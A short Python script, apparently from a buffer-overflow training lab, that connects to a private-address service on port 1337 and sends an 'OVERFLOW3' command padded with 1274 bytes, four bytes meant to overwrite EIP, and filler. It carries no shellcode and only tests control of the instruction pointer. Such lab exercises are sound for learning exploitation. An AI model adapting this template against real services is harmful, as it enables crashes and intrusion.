import socket
import sys
import time


print("[+] Nani???? Space!!\n")

buff = "A" * 1274

eip = "B" * 4

fill = "C" * 422

#Final payload
payload = buff + eip + fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.54.232', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW3 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
